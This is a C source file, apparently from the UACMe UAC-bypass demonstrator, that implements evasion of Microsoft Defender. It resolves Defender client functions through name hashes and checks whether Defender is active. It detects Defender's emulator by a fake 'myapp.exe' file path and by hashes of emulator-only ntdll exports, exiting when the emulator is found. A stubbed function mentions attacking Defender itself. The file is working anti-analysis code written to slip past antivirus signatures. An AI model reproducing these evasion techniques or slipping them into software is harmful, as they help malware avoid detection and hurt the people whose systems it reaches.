/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2018
*
*  TITLE:       WINDEFEND.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  MSE / Windows Defender anti-emulation part.
*
*  WARNING: Kernel32/ntdll only dependencies.
*
*  Short FAQ:
*
*  Q: Why this module included in UACMe,
*     I thought this is demonstrator tool not real malware?
*
*  A: WinDefender is a default AV software installed on every Windows
*     since Windows 8. Because some of the lazy malware authors copy-pasted
*     whole UACMe project in their crappiest malware WinDefender has
*     several signatures to detect UACMe and it components.
*     Example of WinDefend signature: Bampeass. We cannot be prevented by this
*     as this demonstrator must be running on newest Windows OS versions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "shared.h"

#pragma warning(push)
#pragma warning(disable: 4152)

//
// General purpose hashes start here.
//

#define WDStatus_Hash               0x5ed47491
#define MpManagerOpen_Hash          0x156db96c
#define MpHandleClose_Hash          0x1117328a
#define MpManagerVersionQuery_Hash  0x214efb07

//
// End of general purpose hashes.
//

//
// Kuma related hashes start here.
//

//
// End of Kuma related hashes.
//

#define WD_HASH_TABLE_ITEMS 21

DWORD wdxEmulatorAPIHashTable[] = {
    0x3E3CBE69, //VFS_CopyFile
    0x00633A7F, //VFS_DeleteFile
    0x331245AB, //VFS_DeleteFileByHandle
    0xE0A858CF, //VFS_FileExists
    0xDC54FFE2, //VFS_FindClose
    0x1C920626, //VFS_FindFirstFile
    0xAA3ABE29, //VFS_FindNextFile
    0xBAC05205, //VFS_FlushViewOfFile
    0xDB9EFF5A, //VFS_GetAttrib
    0xDBB23222, //VFS_GetHandle
    0xDBA02E4A, //VFS_GetLength
    0xEB0B0115, //VFS_MapViewOfFile
    0x302ABE69, //VFS_MoveFile
    0x5F831879, //VFS_Open
    0x5F82E329, //VFS_Read
    0x7B9EFF5A, //VFS_SetAttrib
    0x5DC47852, //VFS_SetCurrentDir
    0x7BA02E4A, //VFS_SetLength
    0xBAC23515, //VFS_UnmapViewOfFile
    0xFC14FE63, //VFS_Write
    0xD4908D6E  //NtControlChannel
};

MP_API g_MpApiSet;

PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ ULONG ProcedureHash);

/*
* wdxInitApiSet
*
* Purpose:
*
* Retrieve required routine pointers from client dll.
*
*/
BOOL wdxInitApiSet(
    _In_ PVOID MpClientBase)
{
    g_MpApiSet.WDStatus.Hash = WDStatus_Hash;
    g_MpApiSet.WDStatus.Routine = wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.WDStatus.Hash);

    if (g_MpApiSet.WDStatus.Routine == NULL) return FALSE;

    g_MpApiSet.MpHandleClose.Hash = MpHandleClose_Hash;
    g_MpApiSet.MpHandleClose.Routine = wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.MpHandleClose.Hash);

    if (g_MpApiSet.MpHandleClose.Routine == NULL) return FALSE;

    g_MpApiSet.MpManagerOpen.Hash = MpManagerOpen_Hash;
    g_MpApiSet.MpManagerOpen.Routine = wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.MpManagerOpen.Hash);

    if (g_MpApiSet.MpManagerOpen.Routine == NULL) return FALSE;

    g_MpApiSet.MpManagerVersionQuery.Hash = MpManagerVersionQuery_Hash;
    g_MpApiSet.MpManagerVersionQuery.Routine = wdxGetProcedureAddressByHash(
        MpClientBase,
        g_MpApiSet.MpManagerVersionQuery.Hash);

    if (g_MpApiSet.MpManagerVersionQuery.Routine == NULL) return FALSE;

    //
    //  Kuma part.
    //

    return TRUE;
}

/*
* wdGetAVSignatureVersion
*
* Purpose:
*
* Retrieve current AV signature version.
*
*/
_Success_(return != FALSE)
BOOL wdGetAVSignatureVersion(
    _Out_ PMPCOMPONENT_VERSION SignatureVersion
)
{
    BOOL bResult = FALSE;
    MPHANDLE MpHandle;

    MPVERSION_INFO VersionInfo;

    pfnMpManagerOpen MpManagerOpen = (pfnMpManagerOpen)g_MpApiSet.MpManagerOpen.Routine;
    pfnMpHandleClose MpHandleClose = (pfnMpHandleClose)g_MpApiSet.MpHandleClose.Routine;
    pfnMpManagerVersionQuery MpManagerVersionQuery = (pfnMpManagerVersionQuery)g_MpApiSet.MpManagerVersionQuery.Routine;

    if (S_OK == MpManagerOpen(0, &MpHandle)) {
        RtlSecureZeroMemory(&VersionInfo, sizeof(VersionInfo));
        bResult = (S_OK == MpManagerVersionQuery(MpHandle, &VersionInfo));
        RtlCopyMemory(SignatureVersion, &VersionInfo.AVSignature, sizeof(VersionInfo.AVSignature));
        MpHandleClose(MpHandle);
    }
    return bResult;
}

/*
* wdIsEnabled
*
* Purpose:
*
* Return STATUS_TOO_MANY_SECRETS if WD is present and active.
*
*/
NTSTATUS wdIsEnabled(
    VOID)
{
    BOOL fEnabled = FALSE;
    NTSTATUS status = STATUS_NOTHING_TO_TERMINATE;
    pfnWDStatus WDStatus = (pfnWDStatus)g_MpApiSet.WDStatus.Routine;

    if (WDStatus) 
        if (SUCCEEDED(WDStatus(&fEnabled)))
        {
            if (fEnabled)
                status = STATUS_TOO_MANY_SECRETS;
            else
                status = STATUS_NO_SECRETS;
        }
        else
            status = STATUS_NO_SECRETS;

    return status;
}

/*
* wdxGetHashForString
*
* Purpose:
*
* Calculates specific hash for string.
*
*/
DWORD wdxGetHashForString(
    _In_ char *s
)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

/*
* wdxGetProcedureAddressByHash
*
* Purpose:
*
* Return pointer to function in MpClient from name hash value.
*
*/
PVOID wdxGetProcedureAddressByHash(
    _In_ PVOID MpClientBase,
    _In_ ULONG ProcedureHash
)
{
    DWORD i;
    ULONG sz = 0;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names, Functions;
    PWORD Ordinals;

    DWORD_PTR FunctionPtr;

    DosHeader = (IMAGE_DOS_HEADER*)MpClientBase;

    Exports = RtlImageDirectoryEntryToData(MpClientBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return NULL;

    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);
    Ordinals = (PWORD)((PBYTE)DosHeader + Exports->AddressOfNameOrdinals);
    Functions = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfFunctions);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        if (wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i])) == ProcedureHash) {
            FunctionPtr = Functions[Ordinals[i]];
            return (PBYTE)MpClientBase + FunctionPtr;
        }
    }

    return NULL;
}

/*
* wdLoadClient
*
* Purpose:
*
* Load mpengine client dll for further work (e.g. Kuma).
*
* Limitations:
*
*   Warning: This routine will produce incorrect results under MS AV emulator.
*
*/
_Success_(return != NULL)
PVOID wdLoadClient(
    _In_ BOOL IsWow64,
    _Out_opt_ PNTSTATUS Status
)
{
    BOOL        bFound = FALSE;
    HANDLE      hHeap = NtCurrentPeb()->ProcessHeap;
    PVOID       ImageBase = NULL;
    NTSTATUS    status = STATUS_UNSUCCESSFUL;

    PWCHAR EnvironmentBlock = NtCurrentPeb()->ProcessParameters->Environment;
    PWCHAR ptr, lpProgramFiles, lpBuffer;

    UNICODE_STRING usTemp, *us;

    SIZE_T memIO;

    UNICODE_STRING us1 = RTL_CONSTANT_STRING(L"ProgramFiles=");
    UNICODE_STRING us2 = RTL_CONSTANT_STRING(L"ProgramFiles(x86)=");

    us = &us1;

    if (IsWow64)
        us = &us2;

    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            break;

        RtlInitUnicodeString(&usTemp, ptr);
        if (RtlPrefixUnicodeString(us, &usTemp, TRUE)) {
            bFound = TRUE;
            break;
        }

        ptr += _strlen(ptr) + 1;

    } while (1);

    if (bFound) {

        lpProgramFiles = (ptr + us->Length / sizeof(WCHAR));

        memIO = (MAX_PATH + _strlen(lpProgramFiles)) * sizeof(WCHAR);
        lpBuffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpBuffer) {
            _strcpy(lpBuffer, lpProgramFiles);
            _strcat(lpBuffer, TEXT("\\Windows Defender\\MpClient.dll"));

            RtlInitUnicodeString(&usTemp, lpBuffer);

            status = LdrLoadDll(NULL, NULL, &usTemp, &ImageBase);

            if (NT_SUCCESS(status)) {
                if (!wdxInitApiSet(ImageBase)) {
                    status = STATUS_PROCEDURE_NOT_FOUND;
                    LdrUnloadDll(ImageBase);
                    ImageBase = NULL;
                }
            }

            RtlFreeHeap(hHeap, 0, lpBuffer);
        }
        else {
            status = STATUS_NO_MEMORY;
        }
    }
    else
        status = STATUS_VARIABLE_NOT_FOUND;

    if (Status) 
        *Status = status;

    return ImageBase;
}

/*
* wdCheckEmulatedVFS
*
* Purpose:
*
* Detect Microsoft Security Engine emulation by it own VFS artefact.
*
* Microsoft AV provides special emulated environment for scanned application where it
* fakes general system information, process environment structures/data to make sure
* API calls are transparent for scanned code. It also use simple Virtual File System
* allowing this AV track file system changes and if needed continue emulation on new target.
*
* This method implemented in commercial malware presumable since 2013.
*
*/
VOID wdCheckEmulatedVFS(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH];
    WCHAR szMsEngVFS[12] = { L':', L'\\', L'm', L'y', L'a', L'p', L'p', L'.', L'e', L'x', L'e', 0 };

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    GetModuleFileName(NULL, szBuffer, MAX_PATH);
    if (_strstri(szBuffer, szMsEngVFS) != NULL) {
        ExitProcess((UINT)0);
    }
}

/*
* wdIsEmulatorPresent
*
* Purpose:
*
* Detect MS emulator state.
*
*/
NTSTATUS wdIsEmulatorPresent(
    VOID)
{
    PCHAR ImageBase = NULL;

    IMAGE_DOS_HEADER *DosHeader;
    IMAGE_EXPORT_DIRECTORY *Exports;
    PDWORD Names;

    ULONG i, c, Hash, sz = 0;

    UNICODE_STRING usNtdll = RTL_CONSTANT_STRING(L"ntdll.dll");

    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &usNtdll, &ImageBase)))
        return STATUS_DLL_NOT_FOUND;

    Exports = RtlImageDirectoryEntryToData(ImageBase, TRUE,
        IMAGE_DIRECTORY_ENTRY_EXPORT, &sz);

    if (Exports == NULL)
        return STATUS_INVALID_IMAGE_FORMAT;

    DosHeader = (IMAGE_DOS_HEADER*)ImageBase;
    Names = (PDWORD)((PBYTE)DosHeader + Exports->AddressOfNames);

    for (i = 0; i < Exports->NumberOfNames; i++) {
        Hash = wdxGetHashForString((char *)((PBYTE)DosHeader + Names[i]));
        for (c = 0; c < WD_HASH_TABLE_ITEMS; c++) {
            if (Hash == wdxEmulatorAPIHashTable[c])
                return STATUS_NEEDS_REMEDIATION;
        }
    }

    return STATUS_NOT_SUPPORTED;
}

/*
* wdSelfTraverse
*
* Purpose:
*
* Determine if we can use Kuma to send a torpedo to the WD.
*
*/
NTSTATUS wdSelfTraverse(
    _In_ PVOID MpClientBase)
{
    UNREFERENCED_PARAMETER(MpClientBase);

    //  
    // Note: wdxInitApiSet must reflect difference between versions otherwise Kuma will fail.
    //

    return STATUS_NOT_IMPLEMENTED;
}

#pragma warning(pop)
